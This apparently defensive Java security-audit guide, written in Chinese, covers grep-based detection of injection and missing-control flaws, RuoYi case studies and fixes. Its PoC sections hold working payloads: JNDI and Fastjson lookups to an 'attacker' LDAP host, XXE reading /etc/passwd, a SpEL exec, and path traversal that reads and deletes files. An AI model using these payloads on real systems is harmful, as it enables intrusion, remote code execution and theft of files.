# Java Security Audit

> Java 安全审计模块 | **双轨并行完整覆盖**
> 详细规则请查阅对应专项文件

---

## 审计方法论

### 双轨并行框架

```
                    Java 代码安全审计
                           │
         ┌─────────────────┼─────────────────┐
         │                 │                 │
         ▼                 ▼                 ▼
┌─────────────────┐ ┌─────────────────┐ ┌─────────────────┐
│  轨道A (50%)    │ │  轨道B (40%)    │ │  补充 (10%)     │
│  控制建模法     │ │  数据流分析法   │ │  配置+依赖审计  │
│                 │ │                 │ │                 │
│ 缺失类漏洞:     │ │ 注入类漏洞:     │ │ • 硬编码凭据    │
│ • 认证缺失      │ │ • SQL注入       │ │ • 不安全配置    │
│ • 授权缺失      │ │ • XSS           │ │ • CVE依赖       │
│ • IDOR          │ │ • 命令注入      │ │                 │
│ • 竞态条件      │ │ • 反序列化      │ │                 │
│ • 重放攻击      │ │ • SSRF/XXE      │ │                 │
└─────────────────┘ └─────────────────┘ └─────────────────┘
```

### 两轨核心公式

```
轨道A: 缺失类漏洞 = 敏感操作 - 应有控制
轨道B: 注入类漏洞 = Source → [无净化] → Sink
```

**参考文档**:
- `references/core/security_controls_methodology.md` - 完整方法论
- `references/core/data_flow_methodology.md` - 数据流分析

---

# 轨道A: 控制建模法 (缺失类漏洞)

## A1. 敏感操作枚举

### 1.1 快速识别命令

```bash
# 数据修改操作 (CREATE/UPDATE/DELETE)
grep -rn "@PostMapping\|@PutMapping\|@DeleteMapping" --include="*.java"
grep -rn "public.*\(create\|add\|insert\|update\|modify\|edit\|delete\|remove\)" --include="*.java"

# 数据访问操作 (带ID参数的GET)
grep -rn "@GetMapping.*{id}\|@GetMapping.*{.*Id}" --include="*.java"
grep -rn "public.*\(get\|find\|query\|select\).*ById" --include="*.java"

# 批量操作
grep -rn "@.*Mapping.*export\|@.*Mapping.*download\|@.*Mapping.*batch" --include="*.java"
grep -rn "public.*\(export\|download\|batch\|import\)" --include="*.java"

# 权限变更操作
grep -rn "role\|permission\|grant\|assign" --include="*Controller.java"

# 资金操作
grep -rn "transfer\|pay\|refund\|balance\|withdraw\|deposit" --include="*.java"

# 外部请求
grep -rn "RestTemplate\|HttpClient\|OkHttpClient\|WebClient" --include="*.java"

# 文件操作
grep -rn "MultipartFile\|FileInputStream\|FileOutputStream\|Paths\.get" --include="*.java"

# 命令执行
grep -rn "Runtime\.getRuntime\|ProcessBuilder\|\.exec\s*(" --include="*.java"
```

### 1.2 输出模板

```markdown
## Java敏感操作清单

| # | 端点/方法 | HTTP方法 | 敏感类型 | 位置 | 风险等级 |
|---|-----------|----------|----------|------|----------|
| 1 | /api/user/{id} | DELETE | 数据修改 | UserController:45 | 高 |
| 2 | /api/user/{id} | GET | 数据访问 | UserController:32 | 中 |
| 3 | /api/transfer | POST | 资金操作 | AccountController:56 | 严重 |
| 4 | /api/export | GET | 批量操作 | ReportController:78 | 高 |
```

---

## A2. 安全控制建模

### 2.1 Java安全控制实现方式

| 控制类型 | Spring实现方式 | 检查方法 |
|----------|----------------|----------|
| **认证控制** | `@PreAuthorize("isAuthenticated()")`, SecurityFilter | 检查注解或Filter链 |
| **授权控制** | `@PreAuthorize("hasRole('X')")`, `@Secured`, `@RequiresPermissions` | 检查权限注解 |
| **资源所有权** | `entity.getOwnerId().equals(currentUserId)` | 检查Service/Repository代码 |
| **输入验证** | `@Valid`, `@NotNull`, `@Size`, Validator | 检查验证注解 |
| **并发控制** | `@Transactional` + `@Lock`, `SELECT FOR UPDATE` | 检查事务和锁 |
| **审计日志** | `@Audit`注解, AOP, Spring Data Auditing | 检查日志切面 |

### 2.2 控制矩阵模板 (Java)

```yaml
敏感操作: DELETE /api/user/{id}
位置: UserController.java:45
类型: 数据修改

应有控制:
  认证控制:
    要求: 必须登录
    验证: 检查@PreAuthorize或SecurityConfig

  授权控制:
    要求: 管理员或本人
    验证: 检查hasRole/hasPermission

  资源所有权:
    要求: 非管理员只能删除自己的数据
    验证: 检查Service层 user.getId().equals(currentUserId)

  输入验证:
    要求: id必须为正整数
    验证: 检查@PathVariable类型和@Valid
```

---

## A3. 控制存在性验证

### 3.1 数据修改操作验证清单

```markdown
## 控制验证: [端点名称]

### 基本信息
- 端点: _________________
- 位置: _________________
- HTTP方法: POST/PUT/DELETE

### 控制验证

| 控制项 | 应有 | 代码实现 | 结果 |
|--------|------|----------|------|
| 认证控制 | 必须 | @PreAuthorize("isAuthenticated()") | ✅/❌ |
| 授权控制 | 必须 | @PreAuthorize("hasRole('ADMIN')") | ✅/❌ |
| 资源所有权 | 必须(非管理员) | entity.getOwnerId().equals() | ✅/❌ |
| 输入验证 | 必须 | @Valid, @NotNull | ✅/❌ |
| 审计日志 | 推荐 | @Audit或AOP | ✅/❌ |

### 验证命令
```bash
# 检查认证/授权注解
grep -B 5 "public.*delete\|public.*update" [Controller文件] | grep "@PreAuthorize\|@Secured"

# 检查资源所有权验证
grep -A 20 "public.*delete" [Service文件] | grep "getOwnerId\|getCurrentUser"
```
```

### 3.2 数据访问操作验证清单

```markdown
## 控制验证: GET /api/resource/{id}

| 控制项 | 应有 | 代码实现 | 结果 |
|--------|------|----------|------|
| 认证控制 | 视数据敏感性 | SecurityConfig | ✅/❌ |
| 资源所有权 | 必须 | WHERE owner_id = ? | ✅/❌ |
| 数据脱敏 | 推荐 | @JsonIgnore, MaskUtils | ✅/❌ |

### 验证命令
```bash
# 检查查询是否有owner过滤
grep -A 10 "findById\|getById" [Repository文件] | grep "ownerId\|owner_id"

# 检查返回数据是否脱敏
grep -rn "@JsonIgnore\|mask\|desensitize" [Entity/DTO文件]
```
```

### 3.3 资金操作验证清单

```markdown
## 控制验证: POST /api/transfer

| 控制项 | 应有 | 代码实现 | 结果 |
|--------|------|----------|------|
| 认证控制 | 必须 | @PreAuthorize | ✅/❌ |
| 账户所有权 | 必须 | account.getOwnerId().equals() | ✅/❌ |
| 金额校验 | 必须 | amount > 0 && amount <= limit | ✅/❌ |
| 余额检查 | 必须 | balance >= amount (事务内) | ✅/❌ |
| 幂等性 | 必须 | 唯一事务ID/token | ✅/❌ |
| 并发控制 | 必须 | @Lock或SELECT FOR UPDATE | ✅/❌ |

### 验证命令
```bash
# 检查事务和锁
grep -B 5 -A 30 "public.*transfer" [Service文件] | grep "@Transactional\|@Lock\|FOR UPDATE"

# 检查幂等性控制
grep -rn "idempotent\|transactionId\|requestId" --include="*.java"

# 检查余额检查逻辑
grep -A 10 "transfer\|debit" [Service文件] | grep "balance.*>=\|insufficient"
```
```

### 3.4 常见缺失模式 → 漏洞映射

| 缺失控制 | 漏洞类型 | CWE | 验证方法 |
|----------|----------|-----|----------|
| 无@PreAuthorize | 认证缺失 | CWE-306 | 检查Controller方法注解 |
| 无hasRole检查 | 授权缺失 | CWE-862 | 检查权限注解配置 |
| 无ownerId比对 | IDOR | CWE-639 | 检查Service层代码 |
| 无@Lock或FOR UPDATE | 竞态条件 | CWE-362 | 检查资金操作的事务 |
| 无幂等性token | 重放攻击 | CWE-294 | 检查唯一请求ID |
| 无URL白名单 | SSRF | CWE-918 | 检查外部请求代码 |

---

# 轨道B: 数据流分析法 (注入类漏洞)

> **核心公式**: Source → [无净化] → Sink = 注入类漏洞
> **参考**: `references/core/data_flow_methodology.md`

## B1. Java Source (用户输入点)

```java
// HTTP参数
request.getParameter("name")
request.getParameterValues("names")
@RequestParam String param

// HTTP头
request.getHeader("X-Forwarded-For")
@RequestHeader String header

// Cookie
request.getCookies()
@CookieValue String cookie

// 请求体
@RequestBody Object body
request.getInputStream()

// 文件上传
MultipartFile.getOriginalFilename()
MultipartFile.getInputStream()

// 路径参数
@PathVariable String id
```

## B2. Java Sink (危险函数)

| Sink类型 | 漏洞 | CWE | 危险函数 |
|----------|------|-----|----------|
| SQL执行 | SQL注入 | 89 | Statement.execute, ${}拼接 |
| 命令执行 | 命令注入 | 78 | Runtime.exec, ProcessBuilder |
| 反序列化 | RCE | 502 | readObject, JSON.parse |
| XML解析 | XXE | 611 | DocumentBuilder.parse |
| HTTP请求 | SSRF | 918 | HttpClient, RestTemplate |
| 文件操作 | 路径遍历 | 22 | new File, FileInputStream |
| HTML输出 | XSS | 79 | response.getWriter().write |
| 表达式引擎 | RCE | 917 | SpelExpressionParser |

## B3. 污点传播检测命令

### 专项规则文件

| 文件 | 内容 | 行数 |
|------|------|------|
| `java_gadget_chains.md` | 反序列化 Gadget Chain (CC/CB/Spring/C3P0等) | ~1000 |
| `java_fastjson.md` | Fastjson 全版本漏洞 + 绕过 | ~600 |
| `java_jndi_injection.md` | JNDI 注入 + JDK版本限制 | ~500 |
| `java_xxe.md` | XXE 所有解析器 + 防御配置 | ~700 |
| `java_practical.md` | SQL/CMD/SSRF/文件操作/表达式注入 | ~900 |

---

## B4. Sink检测命令 (grep)

> 以下命令用于识别Sink点，需结合Source追踪判断是否存在漏洞

### 反序列化
```bash
grep -rn "ObjectInputStream\|readObject\|XMLDecoder\|XStream\|JSON\.parse\|Yaml\.load" --include="*.java"
```

### JNDI 注入
```bash
# 基础JNDI检测
grep -rn "\.lookup\s*(\|InitialContext\|JdbcRowSetImpl\|\$\{jndi:" --include="*.java"

# JDBC协议注入检测 (CVE-2025-64428)
grep -rn "iiop://\|iiopname:\|corbaname:\|corbaloc:" --include="*.java"

# 协议黑名单检测
grep -rn "illegalParameters\|getIllegal.*Parameters\|blacklist.*protocol" --include="*.java"

# 数据源配置类检测
grep -rn "class.*extends.*Configuration\|DatasourceType\|datasource.*config" --include="*.java"
```

**详细参考**: `references/languages/java_jndi_injection.md`

### XXE
```bash
grep -rn "DocumentBuilder\|SAXParser\|SAXReader\|SAXBuilder\|XMLInputFactory" --include="*.java"
# 检查是否有防御
grep -rn "disallow-doctype-decl\|external-general-entities" --include="*.java"
```

### SQL 注入
```bash
# 1. 扫描所有Controller接口
grep -rn "@GetMapping\|@PostMapping\|@RequestMapping" --include="*.java"

# 2. 追踪Service调用和数据范围注解
grep -rn "Service\.select.*List\|Service\.export\|@DataScope" --include="*.java"

# 3. 检查MyBatis注入点（高危）
grep -rn "\$\{" --include="*.xml"

# 4. 检查concat()函数使用（安全但需验证）
grep -rn "concat\(.*#\{" --include="*.xml"

# 5. 检查动态SQL拼接
grep -rn "StringUtils\.format\|String\.format.*SQL" --include="*.java"

# 6. 检查AOP切面中的SQL操作
grep -rn "@Aspect.*class\|@Before.*@After" --include="*.java" -A 20 | grep -i "sql\|query"

# 7. 完整的SQL注入检测流程
# 扫描Controller → 追踪Service调用 → 识别@DataScope注解 → 检查Mapper.xml中的${}
# → 分析AOP切面逻辑 → 验证参数化查询

# 8. MyBatis ${} 来源追踪
# 发现${params.dataScope} → 搜索dataScope赋值 → 追踪到Aspect类 → 检查SQL拼接安全性
```

### ORM/Query Builder 注入检测

```bash
# JPA/Hibernate HQL注入
# 1. HQL字符串拼接检测
grep -rn "createQuery\s*(" --include="*.java" -A 3 | grep -E "\+|String\.format|concat"

# 2. 原生SQL注入检测
grep -rn "createNativeQuery\s*(\|createSQLQuery\s*(" --include="*.java" -A 3 | grep -E "\+|String\.format"

# 3. JPQL动态查询构造
grep -rn "em\.createQuery\|entityManager\.createQuery" --include="*.java" -A 5 | grep -E "\\+.*WHERE|\\+.*ORDER"

# 4. 检测Hibernate Criteria API不安全用法
grep -rn "Restrictions\.sqlRestriction\|add.*Expression" --include="*.java" -A 2

# JPA Criteria API安全检测
# 1. CriteriaBuilder字符串注入
grep -rn "criteriaBuilder\.\|cb\." --include="*.java" -A 3 | grep -E "literal.*\+|concat.*user"

# 2. Predicate动态构造
grep -rn "Predicate\[\].*predicates\|List<Predicate>" --include="*.java" -A 10 | grep -E "String.*field|user.*input"

# Spring Data JPA高危模式
# 1. @Query注解使用nativeQuery=true
grep -rn "@Query.*nativeQuery.*true" --include="*.java" -A 1 | grep -E "\\?1|:param"

# 2. @Query with string concatenation in value
grep -rn "@Query" --include="*.java" -A 2 | grep -E "value.*\\+|String\.format"

# 3. SpEL表达式注入(Spring Data)
grep -rn "@Query.*#\{" --include="*.java"

# 4. Custom repository implementation检测
grep -rn "class.*RepositoryImpl\|implements.*Repository" --include="*.java" -A 20 | grep -E "createQuery|createNativeQuery"

# QueryDSL检测
# 1. BooleanExpression动态构造
grep -rn "BooleanExpression\|Expressions\.stringTemplate" --include="*.java" -A 5

# 2. SQLTemplates with user input
grep -rn "SQLTemplates\|\.template\s*(" --include="*.java" -A 3 | grep -E "user|input|param"

# jOOQ检测
# 1. Plain SQL injection
grep -rn "DSL\.sql\|dsl\.fetch\s*(\|dsl\.execute\s*(" --include="*.java" -A 2 | grep -E "\\+|String\.format"

# 2. Field name injection
grep -rn "field\s*\(.*name\s*\)\|table\s*\(.*name\s*\)" --include="*.java" -A 1

# MyBatis-Plus高危模式
# 1. Wrapper拼接注入
grep -rn "QueryWrapper.*apply\|UpdateWrapper.*apply" --include="*.java" -A 2

# 2. last()方法注入(拼接到SQL末尾)
grep -rn "\.last\s*(" --include="*.java" -A 1

# 3. 自定义SQL片段
grep -rn "\.customSqlSegment\|\.getSqlSegment" --include="*.java"

# Exposed (Kotlin ORM)检测
grep -rn "exec\s*\(\|\.exec\s*{" --include="*.kt" -A 3 | grep -E "\\$|user|param"

# JDBI检测
grep -rn "@SqlQuery\|@SqlUpdate" --include="*.java" -A 1 | grep -E "String\s+\w+\s*\(\)"

# ORM字段名/表名可控检测
# 1. 动态字段名
grep -rn "field.*=.*request\|column.*=.*param" --include="*.java" -A 5 | grep -E "ORDER BY|GROUP BY|SELECT"

# 2. 动态表名
grep -rn "table.*=.*request\|tableName.*=.*param" --include="*.java" -A 5 | grep "FROM\|JOIN"

# 3. 排序字段可控(常见注入点)
grep -rn "@RequestParam.*sort\|@RequestParam.*order\|@RequestParam.*field" --include="*.java" -A 10 | \
  grep -E "createQuery|queryWrapper|ORDER BY"

# 通用ORM注入模式检测
# 1. 检测repository方法中的字符串拼接
grep -rn "interface.*Repository" --include="*.java" -A 30 | grep -E "@Query.*\\+|nativeQuery.*\\+"

# 2. 检测Service层直接使用EntityManager
grep -rn "EntityManager\s+em\|@PersistenceContext" --include="*.java" -A 15 | \
  grep -E "createQuery.*\\+|createNativeQuery.*\\+"

# 3. 检测Specification动态查询
grep -rn "Specification<.*>.*root\|toPredicate\s*\(" --include="*.java" -A 10 | \
  grep -E "String.*field|user.*param|request\."
```

**检测优先级:**

**Critical (立即修复):**
- HQL/JPQL字符串拼接 (`createQuery("... + userInput")`)
- MyBatis `${}` in WHERE/ORDER BY clauses
- Spring Data `@Query` with `nativeQuery=true` + string concatenation
- MyBatis-Plus `.apply()` with user input
- jOOQ `DSL.sql()` with concatenation

**High (计划修复):**
- 动态字段名/表名without白名单验证
- `Restrictions.sqlRestriction()` with user input
- QueryDSL `Expressions.stringTemplate()` with user data
- `@Query` with SpEL and external input

**Medium (代码审查):**
- Custom repository implementations
- Specification with dynamic field names
- QueryWrapper complex conditions

### 命令执行
```bash
grep -rn "Runtime\.getRuntime\|ProcessBuilder\|\.exec\s*(" --include="*.java"
```

### SSRF
```bash
grep -rn "new URL\|openConnection\|HttpClient\|OkHttpClient\|Request\.Get" --include="*.java"
```

### 文件操作安全
```bash
# 1. 文件下载接口检测
grep -rn "@GetMapping.*download\|@PostMapping.*download\|@RequestMapping.*download" --include="*.java"

# 2. 文件上传接口检测
grep -rn "@PostMapping.*upload\|MultipartFile" --include="*.java"

# 3. 路径拼接风险检测（高危）
grep -rn "path.*\\+.*fileName\|getPath().*\\+\|new File(.*\\.\\." --include="*.java"

# 4. 危险的路径构造模式
grep -rn "new File(File.separator.*fileName\|basePath.*\\+.*fileName" --include="*.java"

# 5. 文件操作Sink点检测
grep -rn "new File(.*)\\|FileInputStream\|FileOutputStream\|Paths.get" --include="*.java"

# 6. FileUtils工具类检测
grep -rn "FileUtils\\.writeBytes\|FileUtils\\.deleteFile\|FileUtils\\.readFile" --include="*.java"

# 7. 文件路径验证检查
grep -rn "getCanonicalPath\|contains.*\\.\\.\|normalize.*path" --include="*.java"

# 8. 权限控制检查
grep -rn "@RequiresPermissions\|@PreAuthorize" --include="*.java" -A 2 | grep -E "download|upload|file"

# 9. 文件类型验证检查
grep -rn "getContentType\|getMimeType\|allowedExtensions\|file.*magic" --include="*.java"

# 10. 真实案例检测（若依漏洞模式）
# 查找: String filePath = basePath + userInput;
# 无验证的 FileUtils.writeBytes(filePath, ...)
grep -rn "String.*filePath.*=.*\\+" --include="*.java" -A 5 | grep "FileUtils\|FileInputStream"
```

### 表达式注入
```bash
grep -rn "SpelExpressionParser\|parseExpression\|MVEL\.eval\|OgnlUtil" --include="*.java"
```

### 模板注入
```bash
grep -rn "Velocity\.evaluate\|Template\.process\|FreeMarker" --include="*.java"
```

### XSS 防护完整性检测
```bash
# 1. 查找XSS过滤器实现
grep -rn "class.*XssFilter\|XssHttpServletRequestWrapper" --include="*.java"

# 2. 检查过滤器是否完整重写所有方法
grep -rn "class.*Wrapper.*HttpServletRequest" --include="*.java" -A 50 | \
  grep -E "getParameter\(|getParameterValues\(|getHeader\(|getQueryString\("

# 3. 检查过滤器配置和排除路径
grep -rn "excludes\|XssFilter\|urlPatterns" --include="*.yml" --include="*.properties" --include="*.java"

# 4. 检查输出转义
grep -rn "escapeHtml\|StringEscapeUtils\|HtmlUtils" --include="*.java"

# 5. 模板引擎配置检查（Thymeleaf/FreeMarker）
grep -rn "th:utext\|th:text\|\$\{.*!\}" --include="*.html"

# 6. 不完整过滤器检测（若依模式）
# 只重写getParameterValues()但缺少getParameter()
# 查找: class XxxWrapper { getParameterValues() } 但没有 getParameter()
```

### 配置文件安全审计
```bash
# 1. 硬编码密码检测
grep -ri "password.*:.*\|secret.*:.*\|key.*:" --include="application*.yml" --include="application*.properties"

# 2. 弱密码检测
grep -ri "password:.*password\|password:.*123456\|password:.*admin" --include="*.yml" --include="*.properties"

# 3. 数据库连接泄露
grep -ri "jdbc:mysql://\|jdbc:postgresql://\|username:.*root" --include="*.yml" --include="*.properties"

# 4. 监控端点暴露检测
grep -ri "druid.*monitor\|actuator\|management\.endpoints" --include="*.yml" --include="*.properties"

# 5. JWT/API密钥硬编码
grep -ri "jwt\.secret\|api\.key\|access\.key" --include="*.yml" --include="*.properties" --include="*.java"

# 6. SSL/TLS配置检查
grep -ri "useSSL.*false\|verifyServerCertificate.*false" --include="*.yml" --include="*.properties"

# 7. Debug模式检查
grep -ri "debug:.*true\|logging\.level.*DEBUG" --include="*.yml" --include="*.properties"
```

### 异常处理安全检测
```bash
# 1. printStackTrace检测
grep -rn "printStackTrace()" --include="*.java"

# 2. System.out/err输出检测
grep -rn "System\.out\.\|System\.err\." --include="*.java"

# 3. 详细错误信息返回
grep -rn "e\.getMessage()\|e\.toString()" --include="*.java" | grep -i "return\|response"

# 4. 敏感信息日志记录
grep -rn "log.*password\|log.*token\|log.*secret" --include="*.java" -i
```

### 反射调用安全检测（新增）

#### 风险模式1: 基础反射调用
```java
// ❌ 高危: 用户可控的反射调用
method.invoke(target, params);  // target和params用户可控
```

#### 风险模式2: 动态方法获取
```java
// ❌ 高危: 动态获取用户指定的方法
Method method = target.getClass().getDeclaredMethod(methodName, String.class);
```

#### 风险模式3: Spring Bean动态加载
```java
// ❌ 高危: 动态加载用户指定的Spring Bean
Object target = SpringContextUtil.getBean(beanName);
```

#### 检测命令
```bash
# 1. 基础反射调用检测
grep -rn "method\.invoke\|Method\.invoke" --include="*.java"

# 2. 动态方法获取检测
grep -rn "getDeclaredMethod\|getMethod" --include="*.java" -B 2 -A 2

# 3. Spring反射工具检测
grep -rn "ReflectionUtils\.invokeMethod" --include="*.java"

# 4. 类动态加载检测
grep -rn "Class\.forName\|ClassLoader\.loadClass" --include="*.java"

# 5. Spring Bean动态获取检测
grep -rn "SpringContextUtil\.getBean\|ApplicationContext\.getBean" --include="*.java"
```

#### 增强反射调用检测（新增全面扫描模式）

```bash
# 6. 组合反射调用链检测（高危）
检测条件：
- 存在反射调用 method.invoke
- 存在动态方法获取 getDeclaredMethod/getMethod
- 存在用户可控参数 methodParams/userInput

风险等级：🔴 高危（远程代码执行）

# 7. Spring Bean反射调用检测
grep -rn "ApplicationContext\\.getBean.*String" --include="*.java" -B 5 -A 5

# 8. 用户可控反射参数检测
grep -rn "methodParams\|invokeTarget" --include="*.java" -B 3 -A 3

# 9. 定时任务反射执行专项检测
grep -rn "ScheduleRunnable\|QuartzJob" --include="*.java" -B 10 -A 10
```

---

## 危险依赖速查

| 依赖 | 危险版本 | 利用方式 |
|------|----------|----------|
| commons-collections | 3.1-3.2.1, 4.0 | CC1-CC7 Gadget |
| commons-beanutils | 1.8.3-1.9.4 | CB1 Gadget |
| fastjson | < 1.2.83 | @type RCE |
| xstream | < 1.4.18 | XML RCE |
| log4j2 | < 2.17.0 | JNDI RCE |
| jackson | enableDefaultTyping | 反序列化 RCE |

---

## Sink/Source 速查

### 反序列化 Sink
```java
ObjectInputStream.readObject()
ObjectInputStream.readUnshared()
XMLDecoder.readObject()
JSON.parseObject()
JSON.parse()
XStream.fromXML()
Yaml.load()
ObjectMapper.readValue()  // enableDefaultTyping
```

### JNDI Sink
```java
InitialContext.lookup(可控参数)
DirContext.lookup(可控参数)
JdbcRowSetImpl.setDataSourceName() + setAutoCommit()
```

### XXE Sink
```java
DocumentBuilder.parse(可控输入)
SAXParser.parse(可控输入)
SAXReader.read(可控输入)
SAXBuilder.build(可控输入)
XMLInputFactory.createXMLStreamReader(可控输入)
```

### 命令执行 Sink
```java
Runtime.getRuntime().exec(cmd)
ProcessBuilder(cmd).start()
ScriptEngine.eval(code)
```

### SQL Sink
```java
Statement.executeQuery(拼接SQL)
PreparedStatement (但用${}拼接)
MyBatis ${} 语法
@Query 字符串拼接

// 框架特定风险点
@DataScope注解驱动的数据过滤
AOP切面中的SQL拼接
Service层方法间的SQL参数传递
导出功能中的SQL查询
```

### 文件操作 Sink
```java
new File(可控路径)
FileInputStream(可控路径)
FileOutputStream(可控路径)
Paths.get(可控路径)

// 框架特定风险
@GetMapping("/download/{fileName}")  // 缺少权限控制
@RequestMapping(value = "/file", params = "fileName")  // 路径拼接风险
```

---

## 审计清单

### 高危 (必查)
- [ ] 反序列化入口点 (readObject/parseObject/fromXML)
- [ ] JNDI lookup 参数可控
- [ ] **JDBC协议黑名单完整性** (iiop/corbaname/iiopname是否在黑名单中)
- [ ] **数据源配置安全** (协议白名单、大小写处理、extraParams过滤)
- [ ] XML 解析未禁用外部实体
- [ ] Fastjson 版本 < 1.2.83
- [ ] Log4j2 版本 < 2.17.0
- [ ] SQL 使用 ${} 或 Statement 拼接
- [ ] 检查所有Controller接口的数据流完整性
- [ ] 验证@DataScope注解的安全性
- [ ] 追踪导出功能的SQL注入风险
- [ ] 文件下载接口路径遍历防护
- [ ] 文件上传接口权限控制和类型验证

### 中危
- [ ] 命令执行参数可控
- [ ] 文件路径可控 (路径遍历)
- [ ] URL 参数可控 (SSRF)
- [ ] 表达式/模板引擎输入可控
- [ ] Spring Actuator 端点暴露
- [ ] 路径拼接操作的安全性验证
- [ ] 文件操作权限注解完整性

### 配置检查
- [ ] application.yml 硬编码密钥
- [ ] CORS 配置过于宽松
- [ ] CSRF 保护是否禁用
- [ ] Debug 模式是否关闭

---

## 快速 POC

### 反序列化检测 (URLDNS)
```bash
java -jar ysoserial.jar URLDNS "http://xxx.dnslog.cn" | base64
```

### JNDI 注入
```bash
# 启动恶意服务
java -jar JNDI-Injection-Exploit.jar -C "whoami" -A "attacker-ip"
# Payload
rmi://attacker:1099/xxx
ldap://attacker:1389/xxx
```

### Fastjson RCE
```json
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker:1389/exp","autoCommit":true}
```

### XXE 文件读取
```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

### SpEL RCE
```java
T(java.lang.Runtime).getRuntime().exec("whoami")
```

---

## 真实漏洞案例库

### 案例1: 若依管理系统 - 任意文件读取/删除
**CVSS 9.1 Critical**

```java
// CommonController.java:24-45
@RequestMapping("common/download")
public void fileDownload(String fileName, Boolean delete, ...) {
    String filePath = Global.getDownloadPath() + fileName;  // ❌ 直接拼接
    FileUtils.writeBytes(filePath, response.getOutputStream());
    if (delete) {
        FileUtils.deleteFile(filePath);  // ❌ 可删除任意文件
    }
}
```

**漏洞分析**:
- fileName参数完全用户可控
- 无路径验证、无..遍历检查
- 无权限控制
- delete参数可删除任意文件

**PoC**:
```
GET /common/download?fileName=../../../../etc/passwd
GET /common/download?fileName=../../../../app/application.yml&delete=true
```

**检测方法**:
```bash
grep -rn "String.*filePath.*=.*\\+" --include="*.java" -A 5 | grep "FileUtils"
grep -rn "@RequestMapping.*download" --include="*.java" -A 10 | grep -E "fileName.*\+|basePath.*\+"
```

---

### 案例2: 若依 - MyBatis数据权限SQL注入风险
**CVSS 6.5 Medium**

```xml
<!-- SysDeptMapper.xml:51 -->
<select id="selectDeptList">
    select * from sys_dept where del_flag = '0'
    ${params.dataScope}  <!-- ❌ 使用${}拼接 -->
</select>
```

虽然dataScope由DataScopeAspect生成，但实现不安全：
```java
// DataScopeAspect.java:94-96
sqlString.append(StringUtils.format(
    " OR {}.dept_id IN (SELECT dept_id FROM sys_role_dept WHERE role_id = {} ) ",
    alias, roleId  // ❌ 字符串拼接
));
baseEntity.getParams().put("dataScope", sqlString.toString());
```

**漏洞分析**:
- 虽然alias来自注解（相对安全）
- 但代码设计违反安全原则
- 如果注解配置可篡改，可能导致SQL注入
- 未使用参数化查询

**修复建议**:
- 使用#{} 替代 ${}
- 对alias使用白名单验证
- 重构为参数化查询

---

### 案例3: 若依 - XSS过滤器不完整
**CVSS 7.2 High**

```java
public class XssHttpServletRequestWrapper extends HttpServletRequestWrapper {
    @Override
    public String[] getParameterValues(String name) {
        // ✅ 有XSS过滤
        String[] values = super.getParameterValues(name);
        escapseValues[i] = Jsoup.clean(values[i], Whitelist.relaxed()).trim();
    }

    // ❌ 缺少这些方法的重写:
    // getParameter(String name)
    // getHeader(String name)
    // getQueryString()
}
```

**绕过方式**:
```java
// Controller中使用getParameter()可绕过XSS过滤
String input = request.getParameter("data");  // ❌ 不会被过滤
String[] inputs = request.getParameterValues("data");  // ✅ 会被过滤
```

**检测方法**:
```bash
# 检查过滤器实现完整性
grep -rn "class.*Wrapper.*HttpServletRequest" --include="*.java" -A 50 | \
  grep -c "getParameter\|getParameterValues\|getHeader"
# 如果数量 < 3，说明不完整
```

---

### 案例4: 若依 - 文件上传类型验证缺失
**CVSS 6.8 Medium**

```java
// FileUploadUtils.java:153-160
public static final void assertAllowed(MultipartFile file) {
    long size = file.getSize();
    if (size > DEFAULT_MAX_SIZE) {
        throw new FileSizeLimitExceededException(...);
    }
    // ❌ 只检查大小，不检查类型！
}
```

虽然文件名被MD5重命名：
```java
filename = Md5Utils.hash(filename + System.nanoTime() + counter++) + extension;
```

但extension直接使用传入值，未验证。

**风险**:
- 可上传恶意文件（虽然文件名被重命名）
- 文件路径构造错误: `new File(File.separator + filename)`

**修复建议**:
```java
// 1. 添加MIME类型白名单
String contentType = file.getContentType();
if (!ALLOWED_TYPES.contains(contentType)) {
    throw new InvalidTypeException();
}

// 2. 验证文件魔术数字
byte[] header = new byte[4];
file.getInputStream().read(header);
if (!isValidFileHeader(header, extension)) {
    throw new InvalidFileException();
}

// 3. 修复路径构造
File desc = new File(uploadDir, filename);  // 正确方式
```

---

### 案例5: 若依 - 配置文件敏感信息泄露
**CVSS 5.5 Medium**

```yaml
# application-druid.yml
druid:
    master:
        url: jdbc:mysql://localhost:3306/ry
        username: root
        password: password  # ❌ 硬编码弱密码
    stat-view-servlet:
        enabled: true
        url-pattern: /monitor/druid/*  # ❌ 无认证监控页面
```

**攻击链**:
1. 访问 /monitor/druid/ 获取数据库信息
2. 利用任意文件读取读application.yml
3. 获取数据库密码
4. 直连数据库

**检测方法**:
```bash
grep -ri "password:.*password\|password:.*123" --include="*.yml"
grep -ri "druid.*stat-view" --include="*.yml" -A 5 | grep "enabled.*true"
```

---

### 案例6: 若依 - 过时依赖CVE
**CVSS 8.0 High**

```xml
<!-- pom.xml -->
<properties>
    <spring-boot.version>2.0.5.RELEASE</spring-boot.version>  <!-- 2018年 -->
    <shiro.version>1.4.0</shiro.version>  <!-- 有认证绕过漏洞 -->
    <druid.version>1.1.10</druid.version>  <!-- 有SQL注入绕过 -->
</properties>
```

**已知CVE**:
- Spring Boot 2.0.5: CVE-2018-15758, CVE-2018-11040
- Shiro 1.4.0: CVE-2020-1957, CVE-2020-11989
- Druid 1.1.10: SQL wall绕过漏洞

**检测方法**:
```bash
mvn dependency-check:check
# 或手动检查
grep -A 2 "<dependency>" pom.xml | grep -E "version|artifactId"
```

---

## 防御要点

| 漏洞 | 防御措施 |
|------|----------|
| 反序列化 | ObjectInputFilter / 升级依赖 / 白名单 |
| JNDI | JDK >= 8u191 / 禁止远程codebase |
| XXE | setFeature禁用外部实体 |
| Fastjson | 升级 >= 1.2.83 / safeMode / 迁移Jackson |
| SQL | PreparedStatement / #{} 参数化 |
| 命令执行 | 白名单 / 禁止shell调用 |
| SSRF | URL白名单 / 禁止内网IP |
| 文件操作 | 路径规范化 / 白名单 / getCanonicalPath验证 |
| XSS | 完整的请求包装器 / 输出转义 |
| 配置安全 | 环境变量 / 加密配置 / 最小权限 |

---

## 最小 PoC 示例
```bash
# JNDI 注入探测 (需受控 LDAP/RMI)
curl 'http://app.example.com/search?name=${jndi:ldap://attacker/a}'

# MyBatis ${} 注入
curl "http://app.example.com/api/user/list?orderBy=id desc;select version()"

# 路径遍历下载
curl "http://app.example.com/common/download?fileName=../../../../etc/passwd"
```

---

